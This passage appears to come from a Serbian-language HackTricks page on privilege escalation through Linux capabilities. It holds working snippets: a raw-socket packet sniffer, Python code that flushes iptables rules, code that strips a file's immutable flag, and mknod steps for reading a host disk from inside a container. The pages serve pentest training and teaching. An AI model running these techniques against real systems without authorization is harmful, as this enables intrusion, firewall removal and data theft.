s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) sposobnost daje nosiocu moć da **menja mrežne konfiguracije**, uključujući podešavanja vatrozida, tabele rutiranja, dozvole za sokete i podešavanja mrežnih interfejsa unutar izloženih mrežnih imenskih prostora. Takođe omogućava uključivanje **promiskuitetnog moda** na mrežnim interfejsima, što omogućava presretanje paketa širom imenskih prostora.

**Primer sa binarnim fajlom**

Pretpostavimo da **python binarni fajl** ima ove sposobnosti.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**To znači da je moguće modifikovati inode atribute.** Ne možete direktno eskalirati privilegije sa ovom sposobnošću.

**Primer sa binarnim fajlom**

Ako otkrijete da je fajl nepromenljiv i da python ima ovu sposobnost, možete **ukloniti nepromenljivi atribut i omogućiti modifikaciju fajla:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Napomena da se obično ovaj nepromenljivi atribut postavlja i uklanja korišćenjem:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava izvršavanje `chroot(2)` sistemskog poziva, što može potencijalno omogućiti bekstvo iz `chroot(2)` okruženja kroz poznate ranjivosti:

* [Kako pobegnuti iz raznih chroot rešenja](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: alat za bekstvo iz chroot-a](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ne samo da omogućava izvršavanje `reboot(2)` sistemskog poziva za restartovanje sistema, uključujući specifične komande kao što su `LINUX_REBOOT_CMD_RESTART2` prilagođene određenim hardverskim platformama, već takođe omogućava korišćenje `kexec_load(2)` i, od Linux 3.17 pa nadalje, `kexec_file_load(2)` za učitavanje novih ili potpisanih crash kernela.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) je odvojen od šireg **CAP_SYS_ADMIN** u Linux 2.6.37, specifično dodeljujući mogućnost korišćenja `syslog(2)` poziva. Ova sposobnost omogućava pregledanje kernel adresa putem `/proc` i sličnih interfejsa kada je podešavanje `kptr_restrict` na 1, što kontroliše izlaganje kernel adresa. Od Linux 2.6.39, podrazumevana vrednost za `kptr_restrict` je 0, što znači da su kernel adrese izložene, iako mnoge distribucije postavljaju ovo na 1 (sakrij adrese osim za uid 0) ili 2 (uvek sakrij adrese) iz bezbednosnih razloga.

Pored toga, **CAP_SYSLOG** omogućava pristup `dmesg` izlazu kada je `dmesg_restrict` postavljen na 1. I pored ovih promena, **CAP_SYS_ADMIN** zadržava mogućnost izvođenja `syslog` operacija zbog istorijskih presedana.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) proširuje funkcionalnost `mknod` sistemskog poziva izvan kreiranja običnih fajlova, FIFOs (imenovanih cevi) ili UNIX domen soketa. Specifično omogućava kreiranje specijalnih fajlova, koji uključuju:

- **S_IFCHR**: Specijalni fajlovi karaktera, koji su uređaji poput terminala.
- **S_IFBLK**: Specijalni blok fajlovi, koji su uređaji poput diskova.

Ova sposobnost je ključna za procese koji zahtevaju mogućnost kreiranja fajlova uređaja, olakšavajući direktnu interakciju sa hardverom putem karakterističnih ili blok uređaja.

To je podrazumevana docker sposobnost ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ova sposobnost omogućava eskalaciju privilegija (kroz potpuno čitanje diska) na hostu, pod sledećim uslovima:

1. Imati inicijalni pristup hostu (neprivilegovan).
2. Imati inicijalni pristup kontejneru (privilegovan (EUID 0), i efektivni `CAP_MKNOD`).
3. Host i kontejner treba da dele isti korisnički prostor.

**Koraci za kreiranje i pristup blok uređaju u kontejneru:**

1. **Na hostu kao standardni korisnik:**
- Odredite svoj trenutni korisnički ID sa `id`, npr., `uid=1000(standarduser)`.
- Identifikujte ciljni uređaj, na primer, `/dev/sdb`.

2. **Unutar kontejnera kao `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Ponovo na hostu:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Ovaj pristup omogućava standardnom korisniku da pristupi i potencijalno pročita podatke sa `/dev/sdb` kroz kontejner, koristeći deljene korisničke imenske prostore i dozvole postavljene na uređaju.

### CAP\_SETPCAP

**CAP_SETPCAP** omogućava procesu da **menja skupove sposobnosti** drugog procesa, omogućavajući dodavanje ili uklanjanje sposobnosti iz efektivnog, naslednog i dozvoljenog skupa. Međutim, proces može da menja samo sposobnosti koje poseduje u svom dozvoljenom skupu, osiguravajući da ne može da poveća privilegije drugog procesa iznad svojih. Nedavne ažuriranja jezgra su pooštrila ova pravila, ograničavajući `CAP_SETPCAP` samo na smanjenje sposobnosti unutar svog ili dozvoljenog skupa svojih potomaka, sa ciljem smanjenja bezbednosnih rizika. Korišćenje zahteva da imate `CAP_SETPCAP` u efektivnom skupu i ciljne sposobnosti u dozvoljenom skupu, koristeći `capset()` za izmene. Ovo sumira osnovnu funkciju i ograničenja `CAP_SETPCAP`, ističući njegovu ulogu u upravljanju privilegijama i poboljšanju bezbednosti.

**`CAP_SETPCAP`** je Linux sposobnost koja omogućava procesu da **menja skupove sposobnosti drugog procesa**. Daje mogućnost dodavanja ili uklanjanja sposobnosti iz efektivnog, naslednog i dozvoljenog skupa sposobnosti drugih procesa. Međutim, postoje određena ograničenja u načinu na koji se ova sposobnost može koristiti.

Proces sa `CAP_SETPCAP` **može samo dodeliti ili ukloniti sposobnosti koje su u njegovom vlastitom dozvoljenom skupu sposobnosti**. Drugim rečima, proces ne može dodeliti sposobnost drugom procesu ako je sam ne poseduje. Ovo ograničenje sprečava proces da poveća privilegije drugog procesa iznad svog nivoa privilegije.

Štaviše, u nedavnim verzijama jezgra, sposobnost `CAP_SETPCAP` je **dodatno ograničena**. Više ne omogućava procesu da proizvoljno menja skupove sposobnosti drugih procesa. Umesto toga, **samo omogućava procesu da smanji sposobnosti u svom dozvoljenom skupu sposobnosti ili dozvoljenom skupu sposobnosti svojih potomaka**. Ova promena je uvedena kako bi se smanjili potencijalni bezbednosni rizici povezani sa sposobnošću.

Da biste efikasno koristili `CAP_SETPCAP`, potrebno je da imate sposobnost u svom efektivnom skupu sposobnosti i ciljne sposobnosti u svom dozvoljenom skupu sposobnosti. Tada možete koristiti sistemski poziv `capset()` za izmene skupova sposobnosti drugih procesa.

Ukratko, `CAP_SETPCAP` omogućava procesu da menja skupove sposobnosti drugih procesa, ali ne može dodeliti sposobnosti koje sam ne poseduje. Pored toga, zbog bezbednosnih briga, njegova funkcionalnost je ograničena u nedavnim verzijama jezgra da bi se omogućilo samo smanjenje sposobnosti u svom dozvoljenom skupu sposobnosti ili dozvoljenim skupovima sposobnosti svojih potomaka.

## Reference

**Većina ovih primera je uzeta iz nekih laboratorija** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), pa ako želite da vežbate ove privesc tehnike preporučujem ove laboratorije.

**Ostale reference**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantnija sajber bezbednosna manifestacija u **Španiji** i jedna od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo okupljalište za profesionalce u tehnologiji i sajber bezbednosti u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
</details>
{% endhint %}
